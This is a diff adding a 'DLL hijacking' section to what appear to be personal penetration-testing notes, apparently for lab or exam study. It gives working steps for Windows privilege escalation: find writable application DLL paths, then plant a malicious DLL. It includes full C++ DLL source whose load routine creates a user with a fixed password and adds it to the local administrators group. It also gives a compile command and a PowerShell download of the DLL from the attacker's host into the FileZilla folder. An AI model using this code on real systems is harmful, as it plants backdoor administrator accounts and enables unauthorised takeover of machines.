@@ -72,11 +72,46 @@ shutdown /r /t 0
 
 DLL HIJACKING
 
+From previous service cmd, enumerate if any of the applications running have known dll exploits. If they do, determine if you can write to the directory by echoing a test file into directory.
 
+Then, open procmon filter mode to enumerate when dll is used. Processes usually look for DLLs in home directory of application before going to System32. This can be observed in procmon.
 
+If this is the case, you can insert your malicious dll and PWN.
 
+ex malicious dll written in c++
 
+#include <stdlib.h>
+#include <windows.h>
 
+BOOL APIENTRY DllMain(
+HANDLE hModule,// Handle to DLL module
+DWORD ul_reason_for_call,// Reason for calling function
+LPVOID lpReserved ) // Reserved
+{
+    switch ( ul_reason_for_call )
+    {
+        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
+        int i;
+  	    i = system ("net user dave3 password123! /add");
+  	    i = system ("net localgroup administrators dave3 /add");
+        break;
+        case DLL_THREAD_ATTACH: // A process is creating a new thread.
+        break;
+        case DLL_THREAD_DETACH: // A thread exits normally.
+        break;
+        case DLL_PROCESS_DETACH: // A process unloads the DLL.
+        break;
+    }
+    return TRUE;
+}
+
+x86_64-w64-mingw32-gcc <copyofdllname>.cpp --shared -o <copyofdllname>.dll -- compile
+
+iwr -uri http://<myip>/TextShaping.dll -OutFile 'C:\FileZilla\FileZilla FTP Client\TextShaping.dll' -- Downloads it into the directory.
+
+Wait 5 minutes.
+
+Should be pwnage.
 
 
 
